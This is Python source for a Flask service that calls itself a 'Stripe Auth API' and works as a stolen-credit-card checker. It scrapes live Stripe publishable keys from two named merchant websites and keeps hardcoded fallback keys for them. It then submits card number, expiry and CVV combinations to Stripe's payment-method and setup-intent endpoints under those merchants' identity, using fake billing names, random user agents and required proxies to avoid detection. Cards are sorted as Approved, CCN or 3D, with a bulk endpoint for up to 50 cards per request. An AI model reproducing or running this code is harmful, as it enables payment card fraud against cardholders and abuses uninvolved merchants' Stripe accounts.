from flask import Flask, jsonify, render_template_string, request
import requests
from fake_useragent import UserAgent
import uuid
import time
import re
import random
import string
import os
import logging
from datetime import timedelta
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.secret_key = os.urandom(24)
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(hours=24)
app.config['DEBUG'] = False
app.config['TESTING'] = False

API_KEY = "afuona_2026"

# Sites to scrape Stripe keys from
STRIPE_SITES = [
    "prontoheat.com",
    "sexywets.ca",
]

# Hardcoded fallback keys (used if scraping fails)
FALLBACK_KEYS = [
    ("prontoheat.com",  "pk_live_aq5B3eo1vH77zIQJFofYSRF9"),
    ("sexywets.ca",     "pk_live_51HwbTnBQRVCrAGkQcnVCufd2VPXynym"),
]

INDEX_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>STRIPE AUTH API</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            font-family: 'Courier New', monospace;
            background: #0a0a0f;
            color: #fff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container { text-align:center; padding:20px; }
        .logo {
            font-size: 3rem;
            font-weight: bold;
            background: linear-gradient(45deg, #00BFFF, #1E90FF);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 10px;
        }
        .sub { color: #b0e0ff; font-size:1.2rem; margin-bottom:30px; }
        .endpoints {
            background: rgba(0,191,255,0.05);
            border: 1px solid #00BFFF33;
            border-radius: 12px;
            padding: 20px;
            text-align: left;
            max-width: 500px;
            margin: 0 auto;
        }
        .ep { margin: 8px 0; color: #4da6ff; font-size:0.9rem; }
        .footer { margin-top:30px; color:#3a5a68; font-size:0.8rem; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">⚡ STRIPE AUTH</div>
        <div class="sub">Direct Stripe Authentication API</div>
        <div class="endpoints">
            <div class="ep">GET /process?key=&cc=&proxy=&site=</div>
            <div class="ep">GET /mass?key=&cards=&proxy=&site=</div>
            <div class="ep">GET /test_proxy?proxy=</div>
            <div class="ep">GET /health</div>
        </div>
        <div class="footer">© 2026 Yosh ~ Ryo</div>
    </div>
</body>
</html>
"""


# ══════════════════════════════════════════════════════════
#  PROXY HELPERS
# ══════════════════════════════════════════════════════════

def parse_proxy(proxy_str):
    """Parse all common proxy formats into requests dict."""
    if not proxy_str:
        return None
    proxy_str = proxy_str.strip()
    proxy_type = 'http'

    m = re.match(r'^(socks5|socks4|http|https)://(.+)$', proxy_str, re.IGNORECASE)
    if m:
        proxy_type = m.group(1).lower()
        proxy_str = m.group(2)

    # user:pass@host:port
    m = re.match(r'^([^:@]+):([^@]+)@([^:@]+):(\d+)$', proxy_str)
    if m:
        user, pw, host, port = m.groups()
        url = f'{proxy_type}://{user}:{pw}@{host}:{port}'
        return {'http': url, 'https': url}

    # host:port:user:pass
    m = re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy_str)
    if m:
        host, port, user, pw = m.groups()
        url = f'{proxy_type}://{user}:{pw}@{host}:{port}'
        return {'http': url, 'https': url}

    # host:port
    m = re.match(r'^([^:@]+):(\d+)$', proxy_str)
    if m:
        host, port = m.groups()
        url = f'{proxy_type}://{host}:{port}'
        return {'http': url, 'https': url}

    return None


def test_proxy(proxy_dict):
    try:
        r = requests.get(
            'https://api.ipify.org?format=json',
            proxies=proxy_dict,
            timeout=10,
            verify=False
        )
        if r.status_code == 200:
            return True, r.json().get('ip', 'unknown')
        return False, 'Bad status'
    except Exception as e:
        return False, str(e)


# ══════════════════════════════════════════════════════════
#  STRIPE KEY SCRAPER
# ══════════════════════════════════════════════════════════

def get_stripe_key(domain, proxy_dict=None):
    """Scrape live Stripe publishable key from a site."""
    urls = [
        f"https://{domain}/my-account/add-payment-method/",
        f"https://{domain}/checkout/",
        f"https://{domain}/?wc-ajax=get_stripe_params",
        f"https://{domain}/wp-admin/admin-ajax.php?action=wc_stripe_get_stripe_params",
        f"https://{domain}/",
    ]
    patterns = [
        r'(pk_live_[a-zA-Z0-9_]{20,})',
        r'"publishableKey"\s*:\s*"(pk_live_[^"]+)"',
        r'"key"\s*:\s*"(pk_live_[^"]+)"',
        r"Stripe\(['\"]?(pk_live_[a-zA-Z0-9_]+)['\"]?\)",
    ]
    headers = {'User-Agent': UserAgent().random}
    for url in urls:
        try:
            r = requests.get(url, headers=headers, proxies=proxy_dict,
                             timeout=10, verify=False)
            if r.status_code == 200:
                for pat in patterns:
                    m = re.search(pat, r.text)
                    if m:
                        key = m.group(1)
                        if key.startswith('pk_live_'):
                            logger.info(f"Found key on {url}: {key[:20]}...")
                            return key
        except Exception as e:
            logger.debug(f"Error scraping {url}: {e}")
            continue
    return None


def find_working_key(site_override=None, proxy_dict=None):
    """Try sites until we find a working Stripe key. Falls back to hardcoded keys."""
    sites = [site_override] if site_override else STRIPE_SITES
    for site in sites:
        site = site.replace('https://', '').replace('http://', '').split('/')[0]
        key = get_stripe_key(site, proxy_dict)
        if key:
            return key, site

    # Fallback to hardcoded keys
    logger.info("Scraping failed, using hardcoded fallback keys")
    for site, key in FALLBACK_KEYS:
        if key and len(key) > 20:
            return key, site

    return None, None


# ══════════════════════════════════════════════════════════
#  DIRECT STRIPE AUTH CHECKER
# ══════════════════════════════════════════════════════════

def stripe_auth(cc, proxy_dict=None, site_override=None):
    """
    Direct Stripe Auth — creates a PaymentMethod then attempts
    a SetupIntent confirm to get a real bank response.
    Returns: {"Status": "Approved|CCN|Declined", "Response": "...", "Site": "..."}
    """
    start = time.time()

    # Parse card
    try:
        parts = cc.strip().split('|')
        if len(parts) != 4:
            return {"Status": "Error", "Response": "Invalid card format", "Time": 0}
        number, mm, yy, cvv = parts
        number = number.strip()
        mm = mm.strip().zfill(2)
        yy = yy.strip()
        if len(yy) == 4:
            yy = yy[-2:]
        cvv = cvv.strip()
    except Exception as e:
        return {"Status": "Error", "Response": f"Parse error: {e}", "Time": 0}

    # Get Stripe key
    stripe_key, site_used = find_working_key(site_override, proxy_dict)
    if not stripe_key:
        return {"Status": "Error", "Response": "No Stripe key found", "Time": 0}

    ua = UserAgent().random
    guid  = str(uuid.uuid4())
    muid  = str(uuid.uuid4())
    sid   = str(uuid.uuid4()) + str(int(time.time()))

    # Step 1: Create PaymentMethod
    pm_data = {
        'type': 'card',
        'card[number]': number,
        'card[exp_month]': mm,
        'card[exp_year]': yy,
        'card[cvc]': cvv,
        'billing_details[name]': _random_name(),
        'billing_details[address][country]': 'US',
        'billing_details[address][postal_code]': _random_zip(),
        'allow_redisplay': 'unspecified',
        'payment_user_agent': f'stripe.js/{uuid.uuid4().hex[:8]}; stripe-js-v3; deferred-intent',
        'referrer': f'https://{site_used}',
        'time_on_page': str(random.randint(30000, 120000)),
        'key': stripe_key,
        'guid': guid,
        'muid': muid,
        'sid': sid,
    }

    try:
        pm_resp = requests.post(
            'https://api.stripe.com/v1/payment_methods',
            data=pm_data,
            headers={
                'User-Agent': ua,
                'Accept': 'application/json',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://js.stripe.com',
                'Referer': 'https://js.stripe.com/',
            },
            proxies=proxy_dict,
            timeout=20,
            verify=False
        )
        pm_json = pm_resp.json()
    except Exception as e:
        return {"Status": "Error", "Response": f"PM creation failed: {str(e)[:60]}", "Time": round(time.time()-start, 2), "Site": site_used}

    if 'id' not in pm_json:
        err = pm_json.get('error', {})
        msg = err.get('message', 'Payment method error')
        code = err.get('code', '')
        status, response = classify(msg, code)
        return {"Status": status, "Response": response, "Time": round(time.time()-start, 2), "Site": site_used}

    pm_id = pm_json['id']

    # Step 2: Create SetupIntent
    si_data = {
        'payment_method_types[]': 'card',
        'payment_method': pm_id,
        'confirm': 'true',
        'key': stripe_key,
        'guid': guid,
        'muid': muid,
        'sid': sid,
    }

    try:
        si_resp = requests.post(
            'https://api.stripe.com/v1/setup_intents',
            data=si_data,
            headers={
                'User-Agent': ua,
                'Accept': 'application/json',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://js.stripe.com',
                'Referer': 'https://js.stripe.com/',
            },
            proxies=proxy_dict,
            timeout=20,
            verify=False
        )
        si_json = si_resp.json()
    except Exception as e:
        return {"Status": "Error", "Response": f"SetupIntent failed: {str(e)[:60]}", "Time": round(time.time()-start, 2), "Site": site_used}

    elapsed = round(time.time() - start, 2)

    si_status = si_json.get('status', '')
    err = si_json.get('error', {})
    last_err = si_json.get('last_setup_error', {})

    # Check next_action for 3DS
    if si_json.get('next_action') or si_status == 'requires_action':
        return {"Status": "3D", "Response": "3D Secure Authentication Required", "Time": elapsed, "Site": site_used}

    if si_status == 'succeeded':
        return {"Status": "Approved", "Response": "Approved ✅✅", "Time": elapsed, "Site": site_used}

    # Parse error from SetupIntent
    error_obj = err if err else last_err
    msg  = error_obj.get('message', '')
    code = error_obj.get('code', '')
    decline_code = error_obj.get('decline_code', '')

    if not msg:
        # Try top-level error
        msg  = si_json.get('error', {}).get('message', 'Unknown error')
        code = si_json.get('error', {}).get('code', '')

    status, response = classify(msg, code, decline_code)
    return {"Status": status, "Response": response, "Time": elapsed, "Site": site_used}


def classify(msg, code='', decline_code=''):
    """Map Stripe error to Status + clean Response."""
    m  = msg.lower()
    c  = code.lower()
    dc = decline_code.lower()

    # CCN — security code incorrect
    if any(k in m for k in ['security code', 'cvc', 'cvv', 'security_code_incorrect',
                              'incorrect_cvc', 'card_incorrect_cvc']) or \
       c in ('incorrect_cvc', 'security_code_incorrect') or \
       dc in ('incorrect_cvc', 'security_code_incorrect'):
        return "CCN", "Your Security Code is Incorrect"

    # 3D Secure
    if any(k in m for k in ['authentication', '3d', 'three_d', 'secure']):
        return "3D", "3D Secure Authentication Required"

    # Approved
    if any(k in m for k in ['succeeded', 'approved', 'success']):
        return "Approved", "Approved ✅✅"

    # Declined — return the real Stripe message
    clean = msg.strip() if msg.strip() else "Your card was declined"
    # Capitalise first letter
    clean = clean[0].upper() + clean[1:] if clean else clean
    return "Declined", clean


def _random_name():
    first = random.choice(['James','John','Robert','Michael','William','David',
                           'Richard','Joseph','Thomas','Charles','Emily','Emma',
                           'Sophia','Isabella','Mia','Olivia','Ava','Charlotte'])
    last  = random.choice(['Smith','Johnson','Williams','Jones','Brown','Davis',
                           'Miller','Wilson','Moore','Taylor','Anderson','Thomas'])
    return f"{first} {last}"


def _random_zip():
    return str(random.randint(10000, 99999))


# ══════════════════════════════════════════════════════════
#  ROUTES
# ══════════════════════════════════════════════════════════

@app.route('/')
def home():
    return render_template_string(INDEX_TEMPLATE)


@app.route('/process')
def process_request():
    try:
        key       = request.args.get('key')
        cc        = request.args.get('cc')
        proxy_str = request.args.get('proxy')
        site      = request.args.get('site', '')

        if key != API_KEY:
            return jsonify({"error": "Invalid API key"}), 401
        if not cc:
            return jsonify({"error": "Missing card"}), 400
        if not proxy_str:
            return jsonify({"error": "Proxy is required"}), 400

        if not re.match(r'^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$', cc.strip()):
            return jsonify({"error": "Invalid card format. Use: NUMBER|MM|YY|CVV"}), 400

        proxy_dict = parse_proxy(proxy_str)
        if not proxy_dict:
            return jsonify({"error": "Invalid proxy format"}), 400

        site = site.replace('https://', '').replace('http://', '').split('/')[0] if site else None

        result = stripe_auth(cc, proxy_dict=proxy_dict, site_override=site)
        return jsonify(result)

    except Exception as e:
        logger.error(f"/process error: {e}")
        return jsonify({"error": str(e)}), 500


@app.route('/mass')
def mass_request():
    try:
        key        = request.args.get('key')
        cards_str  = request.args.get('cards')
        proxy_str  = request.args.get('proxy')
        site       = request.args.get('site', '')

        if key != API_KEY:
            return jsonify({"error": "Invalid API key"}), 401
        if not cards_str:
            return jsonify({"error": "Missing cards"}), 400
        if not proxy_str:
            return jsonify({"error": "Proxy is required"}), 400

        proxy_dict = parse_proxy(proxy_str)
        if not proxy_dict:
            return jsonify({"error": "Invalid proxy format"}), 400

        site = site.replace('https://', '').replace('http://', '').split('/')[0] if site else None
        cards = [c.strip() for c in cards_str.split(',') if c.strip()][:50]

        results  = []
        approved = ccn = threed = declined = 0

        for card in cards:
            res = stripe_auth(card, proxy_dict=proxy_dict, site_override=site)
            s   = res.get('Status', 'Declined')
            if s == 'Approved':   approved += 1
            elif s == 'CCN':      ccn      += 1
            elif s == '3D':       threed   += 1
            else:                 declined += 1
            results.append({
                "card":     card,
                "status":   s,
                "response": res.get('Response', ''),
                "time":     res.get('Time', 0),
                "site":     res.get('Site', ''),
            })

        return jsonify({
            "results": results,
            "stats": {
                "total":    len(results),
                "approved": approved,
                "ccn":      ccn,
                "3d":       threed,
                "declined": declined,
            }
        })

    except Exception as e:
        logger.error(f"/mass error: {e}")
        return jsonify({"error": str(e)}), 500


@app.route('/test_proxy')
def test_proxy_route():
    proxy_str = request.args.get('proxy')
    if not proxy_str:
        return jsonify({"error": "Missing proxy"}), 400
    proxy_dict = parse_proxy(proxy_str)
    if not proxy_dict:
        return jsonify({"error": "Invalid proxy format"}), 400
    ok, result = test_proxy(proxy_dict)
    if ok:
        return jsonify({"success": True, "ip": result})
    return jsonify({"success": False, "error": result}), 400


@app.route('/health')
def health():
    return jsonify({"status": "healthy", "api": "Stripe Auth"}), 200


@app.errorhandler(404)
def not_found(e):
    return jsonify({"error": "Endpoint not found"}), 404


@app.errorhandler(500)
def server_error(e):
    return jsonify({"error": "Internal server error"}), 500


if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8000))
    print("⚡ Stripe Auth API")
    print("=" * 50)
    print(f"🚀 Port: {port}")
    print(f"🔑 Key: {API_KEY}")
    print(f"🌐 Sites: {', '.join(STRIPE_SITES)}")
    print("=" * 50)
    app.run(host='0.0.0.0', port=port, debug=False)
